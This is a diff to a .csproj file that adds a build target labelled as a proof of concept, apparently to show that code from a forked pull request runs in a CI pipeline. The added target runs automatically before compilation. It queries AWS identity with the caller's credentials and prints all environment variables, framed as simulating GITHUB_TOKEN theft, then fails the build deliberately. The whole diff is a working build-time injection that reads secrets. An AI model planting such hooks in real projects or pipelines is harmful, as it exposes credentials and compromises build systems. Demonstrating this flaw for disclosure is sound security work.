@@ -20,4 +20,17 @@
     </None>
   </ItemGroup>
 
+  <!-- PoC Start: This target will run before the build -->
+  <Target Name="MaliciousBuildStep" BeforeTargets="CoreBuild">
+    <Exec Command="echo '>>> PoC: EXECUTING CODE FROM FORKED PR (in .csproj) <<<'"/>
+    <Exec Command="echo '>>> PoC: Attempting AWS CLI command to identify role:'"/>
+    <Exec Command="aws sts get-caller-identity || echo 'PoC: aws command failed or no AWS credentials found.'"/>
+    <Exec Command="echo '>>> PoC: Listing environment variables (simulating GITHUB_TOKEN theft attempt):'"/>
+    <Exec Command="env"/>
+    <Exec Command="echo '>>> PoC: TEST FINISHED, FAILING INTENTIONALLY <<<'"/>
+    <Exec Command="bash -c 'exit 1'" Condition="$([MSBuild]::IsOsPlatform('Linux')) Or $([MSBuild]::IsOsPlatform('OSX'))" />
+    <Exec Command="cmd /c exit 1" Condition="$([MSBuild]::IsOsPlatform('Windows'))" />
+  </Target>
+  <!-- PoC End -->
+
 </Project>
